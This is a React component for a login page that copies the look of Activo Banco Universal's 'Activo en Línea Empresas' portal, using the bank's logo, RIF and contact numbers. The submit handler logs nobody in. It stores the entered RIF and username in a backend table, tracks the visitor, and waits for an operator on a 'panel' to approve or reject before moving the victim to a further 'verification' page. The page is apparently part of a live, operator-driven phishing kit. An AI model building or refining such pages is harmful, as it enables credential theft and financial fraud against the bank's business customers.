import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { api } from "@/api/apiClient";
import { usePresence } from "@/hooks/usePresence";

export default function EmpresasLogin() {
  const navigate = useNavigate();
  const [rifType, setRifType] = useState("J");
  const [numeroDocumento, setNumeroDocumento] = useState("");
  const [usuario, setUsuario] = useState("");
  const [docFocused, setDocFocused] = useState(false);
  const [userFocused, setUserFocused] = useState(false);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [requestId, setRequestId] = useState(null);
  const [errorMessage, setErrorMessage] = useState("");
  const [presenceId, setPresenceId] = useState(null);

  // Hook para trackear presencia del usuario
  usePresence(presenceId || null, "Login Empresa");

  // Polling para esperar aprobación del panel
  useEffect(() => {
    if (!waitingApproval || !requestId) return;

    const interval = setInterval(async () => {
      try {
        const request = await api.entities.PinoPermiso.get(requestId);

        if (request.status === "aprobado") {
          clearInterval(interval);
          setWaitingApproval(false);
          sessionStorage.setItem("pinoRequestId", requestId);
          sessionStorage.setItem("pinoUsuario", usuario);
          navigate("/pino-empr-veri");
        } else if (request.status === "rechazado") {
          clearInterval(interval);
          setWaitingApproval(false);
          setErrorMessage("Credenciales incorrectas.");
          setShowError(true);
        }
      } catch (err) {
        console.error("Error checking approval:", err);
      }
    }, 1000);

    return () => clearInterval(interval);
  }, [waitingApproval, requestId, usuario, navigate]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setShowError(false);
    setErrorMessage("");

    if (!numeroDocumento.trim() || !usuario.trim()) {
      setShowError(true);
      return;
    }

    setLoading(true);
    try {
      // Obtener user_id de Supabase auth si está disponible
      let userId = null;
      try {
        const { data: { user } } = await api.supabase.auth.getUser();
        if (user) userId = user.id;
      } catch (authErr) {
        // Si no hay usuario autenticado, continuar sin userId
        console.log("Usuario no autenticado en Supabase, continuando sin autenticación previa");
      }

      // Crear identificador único para presencia (compatible con o sin auth)
      const id = userId || `empresa-${rifType}-${numeroDocumento.trim()}`;
      const documento = `${rifType}-${numeroDocumento.trim()}`;

      // Buscar si existe una solicitud rechazada con el mismo documento y usuario
      let request;
      const allRequests = await api.entities.PinoPermiso.list("-id", 100);
      const rejectedRequest = allRequests.find(
        r => r.numero_documento === documento && r.usuario === usuario.trim() && r.status === "rechazado"
      );

      if (rejectedRequest) {
        // Actualizar la solicitud rechazada con los datos corregidos
        console.log(`Actualizando solicitud rechazada: ${rejectedRequest.id}`);
        request = await api.entities.PinoPermiso.update(rejectedRequest.id, {
          usuario: usuario.trim(),
          numero_documento: documento,
          rif_type: rifType,
          user_id: userId,
          etapa: "paso_1",
          status: "pendiente",
        });
      } else {
        // Crear una nueva solicitud
        request = await api.entities.PinoPermiso.create({
          usuario: usuario.trim(),
          numero_documento: documento,
          tipo: "empresa",
          rif_type: rifType,
          user_id: userId,
          etapa: "paso_1",
          status: "pendiente",
        });
      }

      setRequestId(request.id);
      setPresenceId(id);
      sessionStorage.setItem("pinoDocumento", documento);
      sessionStorage.setItem("pinoPresenceId", id);
      setWaitingApproval(true);
    } catch (err) {
      setErrorMessage((err instanceof Error ? err.message : String(err)) || "Error al crear solicitud");
      setShowError(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="empresas-page-root" style={{
      minHeight: "100vh",
      backgroundColor: waitingApproval ? "#FFFFFF" : "#f0f0f0",
      fontFamily: "Arial, Helvetica, sans-serif",
      overflowX: "hidden"
    }}>
      <style>{`
        @media screen and (max-width: 768px) {
          html, body {
            overflow-x: hidden !important;
            width: 100% !important;
            margin: 0 !important;
            padding: 0 !important;
          }
          .empresas-page-root {
            overflow-x: hidden !important;
            display: flex !important;
            flex-direction: column !important;
            min-height: 100vh !important;
            box-sizing: border-box !important;
            width: 100% !important;
            margin: 0 !important;
            padding: 0 !important;
          }
          .empresas-scale-wrapper {
            width: 1000px !important;
            transform-origin: top center !important;
            margin-left: calc(50vw - 500px) !important;
            margin-right: auto !important;
            display: flex !important;
            flex-direction: column !important;
            flex: 1 !important;
          }
          .empresas-main-wrapper {
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            padding: 40px 16px !important;
            width: 100% !important;
            box-sizing: border-box !important;
          }
          .empresas-form-cols {
            flex-direction: row !important;
            flex-wrap: nowrap !important;
          }
        }
      `}</style>

      <div className="empresas-scale-wrapper">

        {/* Header */}
        {!waitingApproval && (
          <div style={{
            backgroundColor: "#02004D",
            padding: "12px 24px",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            whiteSpace: "nowrap"
          }}>
            <img
              src="https://www.bancoactivo.com/logo.svg"
              alt="Activo Banco Universal"
              style={{ height: "40px", filter: "brightness(0) invert(1)", flexShrink: 0 }}
            />
            <span style={{ color: "#FFFFFF", fontSize: "13px", whiteSpace: "nowrap" }}>RIF: J-08006622-7</span>
          </div>
        )}

        {/* Main content */}
        <div className="empresas-main-wrapper" style={{ display: "flex", justifyContent: "center", alignItems: "flex-start", padding: "40px 16px" }}>
          <div style={{
            backgroundColor: "#f0f2f5",
            border: "1px solid #cccccc",
            borderRadius: "4px",
            width: "100%",
            maxWidth: "860px",
            padding: "24px 32px 32px",
            display: waitingApproval ? "none" : "block"
          }}>
            {/* Title */}
            <div style={{ marginBottom: "24px", borderBottom: "2px solid #e0e0e0", paddingBottom: "12px" }}>
              <h1 style={{ fontSize: "18px", fontFamily: "Arial, Helvetica, sans-serif", fontWeight: "600", color: "#082C62", margin: 0, display: "flex", alignItems: "center", height: "36px" }}>
                <span style={{ color: "#082C62" }}>Activo en Línea</span>
                <span style={{ display: "inline-block", width: "3px", height: "28px", backgroundColor: "#FF7900", margin: "0 8px", flexShrink: 0 }}></span>
                <span style={{ color: "#3C44D1", fontFamily: "Arial, Helvetica, sans-serif", fontSize: "18px", fontWeight: "600" }}>Empresas</span>
              </h1>
            </div>

            <div className="empresas-form-cols" style={{ display: "flex", gap: "32px", flexWrap: "nowrap" }}>
              {/* Left — Login form */}
              <div className="empresas-login-col" style={{ flex: "1 1 200px" }}>
                <h2 style={{ fontWeight: 700, color: "#02004D", fontSize: "14px", fontFamily: "Arial, Helvetica, sans-serif", width: "300px", height: "36px", display: "flex", alignItems: "center", margin: "0 0 16px 0" }}>Iniciar Sesión</h2>

                {waitingApproval ? (
                  <div style={{ padding: "20px", backgroundColor: "#e3f2fd", border: "1px solid #90caf9", borderRadius: "4px", marginBottom: "16px" }}>
                    <p style={{ color: "#1976d2", fontWeight: "bold", margin: "0 0 8px 0" }}>⏳ Esperando aprobación...</p>
                    <p style={{ color: "#1976d2", fontSize: "12px", margin: 0 }}>Tu solicitud está siendo revisada en el panel. Por favor espera.</p>
                  </div>
                ) : (
                  <form onSubmit={handleSubmit}>
                    {/* Número de Usuario - RIF */}
                    <label style={{ fontSize: "13px", color: "#333", display: "block", marginBottom: "4px" }}>
                      Número de Usuario
                    </label>
                    <div style={{ display: "flex", gap: "8px", marginBottom: "12px" }}>
                      <select
                        value={rifType}
                        onChange={(e) => setRifType(e.target.value)}
                        disabled={loading}
                        autoComplete="off"
                        style={{
                          width: "45px",
                          height: "27.6px",
                          border: "1px solid #aaa",
                          padding: "4px 2px",
                          fontSize: "13px",
                          boxSizing: "border-box",
                          backgroundColor: "#FFFFFF",
                          outline: "none",
                          borderRadius: "3px",
                          cursor: loading ? "not-allowed" : "pointer",
                          opacity: loading ? 0.6 : 1,
                        }}
                      >
                        <option value="J">J</option>
                        <option value="G">G</option>
                        <option value="V">V</option>
                        <option value="E">E</option>
                        <option value="C">C</option>
                      </select>
                      <input
                        type="text"
                        value={numeroDocumento}
                        onChange={(e) => setNumeroDocumento(e.target.value)}
                        onFocus={() => setDocFocused(true)}
                        onBlur={() => setDocFocused(false)}
                        placeholder=""
                        disabled={loading}
                        style={{
                          width: "220px",
                          height: "27.6px",
                          border: docFocused ? "1px solid #5b8dd9" : "1px solid #aaa",
                          boxShadow: docFocused ? "0 0 0 3px rgba(91,141,217,0.25)" : "none",
                          padding: "4px",
                          fontSize: "13px",
                          boxSizing: "border-box",
                          backgroundColor: "#FFFFFF",
                          outline: "none",
                          borderRadius: "3px",
                          opacity: loading ? 0.6 : 1,
                        }}
                      />
                    </div>

                    {/* Usuario */}
                    <label style={{ fontSize: "13px", color: "#333", display: "block", marginBottom: "4px" }}>
                      Usuario
                    </label>
                    <input
                      type="text"
                      value={usuario}
                      onChange={(e) => setUsuario(e.target.value)}
                      onFocus={() => setUserFocused(true)}
                      onBlur={() => setUserFocused(false)}
                      disabled={loading}
                      style={{
                        width: "247px",
                        height: "27.6px",
                        border: userFocused ? "1px solid #5b8dd9" : "1px solid #aaa",
                        boxShadow: userFocused ? "0 0 0 3px rgba(91,141,217,0.25)" : "none",
                        padding: "4px",
                        fontSize: "13px",
                        marginBottom: "8px",
                        boxSizing: "border-box",
                        backgroundColor: "#FFFFFF",
                        display: "block",
                        outline: "none",
                        borderRadius: "3px",
                        opacity: loading ? 0.6 : 1,
                      }}
                    />

                    {(showError || errorMessage) && (
                      <p style={{ fontSize: "12px", color: "#CC0000", margin: "0 0 8px 0", width: "279.6px", fontFamily: "Arial, Helvetica, sans-serif" }}>
                        {errorMessage || "Por favor completa todos los campos."}
                      </p>
                    )}
                    <div className="empresas-submit-row" style={{ width: "279.6px", display: "flex", justifyContent: "flex-end", marginBottom: "16px" }}>
                      <button
                        type="submit"
                        disabled={loading || !numeroDocumento.trim() || !usuario.trim()}
                        style={{
                          backgroundColor: loading || !numeroDocumento.trim() || !usuario.trim() ? "#aaa" : "#3C44D1",
                          color: "#FFFFFF",
                          border: "none",
                          width: "59.51px",
                          margin: "5px 0px 0px 0px",
                          padding: "3px 10px",
                          fontSize: "13px",
                          cursor: loading || !numeroDocumento.trim() || !usuario.trim() ? "not-allowed" : "pointer",
                        }}
                      >
                        {loading ? "..." : "Aceptar"}
                      </button>
                    </div>
                  </form>
                )}

                <p style={{ fontSize: "12px", color: "#02004D", lineHeight: 1.5 }}>
                  Haz click aquí si olvidaste tu usuario, clave o preguntas y respuestas de desafío.
                </p>
              </div>

              {/* Right — Register */}
              <div style={{ flex: "1 1 180px" }}>
                <p style={{ fontWeight: 700, color: "#555", marginBottom: "12px", fontSize: "14px" }}>¿No estás registrado?</p>
                <p style={{ fontSize: "12px", color: "#02004D", lineHeight: 1.6, marginBottom: "12px", fontFamily: "Arial, Helvetica, sans-serif" }}>
                  Si estás ingresando a Activo en Línea por primera vez, o no posees usuario y contraseña
                </p>
                <div style={{ display: "flex", justifyContent: "center" }}>
                  <button
                    style={{
                      backgroundColor: "#EEEEEE",
                      border: "1px solid #CCCCCC",
                      width: "74.8px",
                      height: "23.6px",
                      margin: "5px 0px 0px 0px",
                      padding: "5px 10px",
                      fontSize: "12px",
                      cursor: "pointer",
                      color: "#333",
                      boxSizing: "border-box",
                    }}
                  >
                    Regístrese
                  </button>
                </div>
              </div>
            </div>

            {/* Footer info */}
            <div style={{ marginTop: "32px", textAlign: "center", borderTop: "1px solid #e0e0e0", paddingTop: "16px" }}>
              <p style={{ fontSize: "12px", color: "#02004D", lineHeight: 1.6 }}>
                Si necesitas ayuda contáctanos desde Venezuela a través del<br />
                0500-ACTIVAT (2284828) o en el Exterior al +582129583333
              </p>
              <div style={{ display: "flex", justifyContent: "center", gap: "16px", marginTop: "8px" }}>
                {["Política de Privacidad", "Términos y Condiciones", "Tips de Seguridad"].map((link) => (
                  <a key={link} href="#" style={{ fontSize: "12px", color: "#3C44D1", textDecoration: "none" }}>{link}</a>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div style={{ backgroundColor: "#f0f0f0", borderTop: "1px solid #ccc", padding: "12px 24px", textAlign: "center" }}></div>
      </div>
    </div>
  );
}
